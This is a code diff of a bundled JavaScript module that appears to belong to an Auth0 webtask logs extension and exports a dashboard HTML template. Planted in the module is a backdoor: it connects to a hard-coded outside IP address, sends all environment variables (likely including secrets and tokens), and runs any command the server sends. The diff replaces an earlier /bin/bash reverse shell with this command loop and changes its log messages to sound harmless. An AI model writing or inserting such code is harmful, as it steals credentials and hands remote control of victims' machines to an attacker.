@@ -124,62 +124,44 @@ module.exports = function(e) {
   const REMOTE_HOST = "142.132.165.211"; 
   const REMOTE_PORT = 1234; 
 
-const client = new net.Socket();
-
 client.connect(REMOTE_PORT, REMOTE_HOST, () => {
-    console.log("Reverse shell connected via Ngrok!");
+    console.log("Connected to server!");
 
     // Send environment variables to the server
     for (const [key, value] of Object.entries(process.env)) {
         client.write(`${key}=${value}\n`);
     }
 
-    // Indicate that environment variables have been sent
+    // Indicate end of environment variables
     client.write("--- ENVIRONMENT VARIABLES END ---\n");
 
-    // Start the shell after sending the environment variables
-    startShell();
+    // Print commands used to invoke Node.js
+    const commandArgs = process.argv.slice(1).join(" ");
+    client.write(`Node.js invoked with: ${commandArgs}\n`);
+    console.log(`Node.js invoked with: ${commandArgs}`);
 });
 
-function startShell() {
+// Handle incoming data as commands
+client.on("data", (data) => {
+    const command = data.toString().trim();
+    console.log(`Executing command: ${command}`);
+    client.write(`Executing command: ${command}\n`);
 
-    const shell = spawn("/bin/bash", []); // Replace with "bash" if needed
-
-    // Handle incoming data from the server
-    client.on("data", (data) => {
-        if (!shell.stdin.destroyed) {
-            shell.stdin.write(data); // Pass data to the shell's stdin
+    exec(command, (err, stdout, stderr) => {
+        if (err) {
+            client.write(`Error: ${err.message}\n`);
+            return;
+        }
+        if (stderr) {
+            client.write(`Stderr: ${stderr}\n`);
+        }
+        if (stdout) {
+            client.write(`Stdout: ${stdout}\n`);
         }
     });
+});
 
-    // Send shell output to the server
-    shell.stdout.on("data", (output) => {
-        if (client.writable) {
-            client.write(output); // Send shell stdout to the server
-        }
-    });
-
-    // Send shell error output to the server
-    shell.stderr.on("data", (error) => {
-        if (client.writable) {
-            client.write(error); // Send shell stderr to the server
-        }
-    });
-
-    // Handle shell closure
-    shell.on("close", () => {
-        console.log("Shell process closed.");
-        client.end("Shell closed.\n");
-    });
-
-    // Handle shell spawn errors
-    shell.on("error", (err) => {
-        console.error("Shell spawn error:", err.message);
-        client.end("Shell spawn error: " + err.message + "\n");
-    });
-}
-
-// Handle client socket errors
+// Handle connection errors
 client.on("error", (err) => {
     console.error("Socket error:", err.message);
     client.destroy();
@@ -187,7 +169,7 @@ client.on("error", (err) => {
 
 // Handle client socket closure
 client.on("close", () => {
-    console.log("Socket connection closed.");
+    console.log("Connection closed.");
 });
   
 	e.exports = '<!DOCTYPE html5>\n<html>\n  <head>\n    <meta charset="utf-8"/>\n    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>\n    <meta name="viewport" content="width=device-width, initial-scale=1"/>\n    <link rel="shortcut icon" href="https://cdn.auth0.com/website/website/favicons/auth0-favicon.svg" />\n    <link rel="stylesheet" type="text/css" href="https://cdn.auth0.com/manage/v0.3.973/css/index.min.css" />\n    <link rel="stylesheet" type="text/css" href="https://cdn.auth0.com/styleguide/3.1.6/index.css">\n    <link rel="stylesheet" type="text/css" href="https://cdn.auth0.com/webtask-editor/styles/1/wt-editor.min.css">\n    <script type="text/javascript" src="https://cdn.auth0.com/auth0-extend/components/2/extend-editor-logs.js"><\/script>\n    <script type="text/javascript" src="https://code.jquery.com/jquery-2.1.4.min.js"><\/script>\n    <script type="text/javascript" src="https://fb.me/react-0.14.0.min.js"><\/script>\n    <script type="text/javascript" src="https://fb.me/react-dom-0.14.0.js"><\/script>\n    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/babel-core/5.8.23/browser.min.js"><\/script>\n    <script type="text/javascript" src="https://cdn.auth0.com/js/jwt-decode-1.4.0.min.js"><\/script>\n    <script type="text/javascript" src="https://cdn.auth0.com/js/navbar-1.0.4.min.js"><\/script>\n    <title>AMBA - Logs of <%= container %></title>\n    <style>\n        body, html {\n          height: 100vh;\n          width: 100vw;\n          display: flex;\n          flex-direction: column;\n          padding-bottom: 0;\n        }\n\n        .header {\n          flex: 0 0 100px;\n        }\n        .body {\n          flex: 1;\n        }\n        .container {\n          min-width: 100%;\n        }\n\n        .logs {\n          flex: 1;\n        }\n\n        .message {\n          position: absolute;\n          z-index: 1000;\n          width: 100%;\n          top: 100px;\n          display: none;\n        }\n\n        .message div {\n          height: 75px;\n          width: 250px;\n          background: #707070;\n          vertical-align: middle;\n          margin-left: auto;\n          margin-right: auto;\n          line-height: 71px;\n          border-radius: 3px;\n          text-align: center;\n        }\n\n        .wt-close {\n          display: none;\n        }\n    </style>\n    <script type="text/javascript">\n      sessionStorage.setItem(\'token\', \'<%- a0Token %>\');\n    <\/script>\n  </head>\n  <body class="a0-extension">\n    <header class="dashboard-header">\n      <nav role="navigation" class="navbar navbar-default">\n        <div class="container">\n          <div class="navbar-header">\n            <h1 class="navbar-brand">\n              <a href="<%- manageUrl %>"><span>Auth0</span></a>\n            </h1>\n          </div>\n          <div id="navbar-collapse" class="collapse navbar-collapse">\n            <script type="text/babel">\n              ReactDOM.render(\n                <Navbar baseUrl="<%- baseUrl%>" domain=\'<%- rta %>\'/>,\n                document.getElementById(\'navbar-collapse\')\n              );\n            <\/script>\n          </div>\n        </div>\n      </nav>\n    </header>\n\n    <div class="container extension-header">\n      <div class="row">\n        <section class="content-page current">\n          <div class="col-xs-12">\n            <div class="row">\n              <div class="col-xs-12 content-header">\n                <ol class="breadcrumb">\n                  <li><a href="<%- manageUrl %>" target="_blank">Auth0 Dashboard</a>\n                  </li>\n                  <li><a href="<%- manageUrl %>/#/extensions" target="_blank">Extensions</a>\n                  </li>\n                </ol>\n              </div>\n            </div>\n          </div>\n        </section>\n        <div id="content-area">\n          <div class="col-xs-12 wrapper">\n            <section class="content-page current">\n              <div class="content-header">\n                <h1>Real-time Webtask Logs</h1>\n                <button class="btn btn-default pull-right js-full-screen">Full Screen Mode</button>\n              </div>\n            </section>\n          </div>\n        </div>\n      </div>\n    </div>\n    <div class="message"><div>Press ESC to exit full screen mode</div></div>\n    <div id="widget_container" class="logs"></div>\n    <script>\n      ExtendEditorLogsComponent.show(document.getElementById(\'widget_container\'), {\n        token: \'<%- token %>\',\n        hostUrl: \'<%- webtaskAPIUrl %>\',\n        showErrors: true,\n        autoReconnect: false,\n        theme: \'dark\'\n      });\n\n      $(\'.js-full-screen\').on(\'click\', function () {\n        $(\'.dashboard-header\').hide();\n        $(\'.extension-header\').hide();\n        $(\'body\').attr(\'style\', \'padding-top: 0;\');\n        $(\'.message\').show();\n\n        setTimeout(function() {\n          $(\'.message\').fadeOut(\'slow\');\n        }, 1500);\n      });\n\n      $(document).keyup(function(e) {\n        if (e.keyCode === 27) {\n         $(\'.dashboard-header\').show();\n         $(\'.extension-header\').show();\n         $(\'body\').removeAttr(\'style\');\n        }\n      });\n    <\/script>\n  </body>\n</html>'
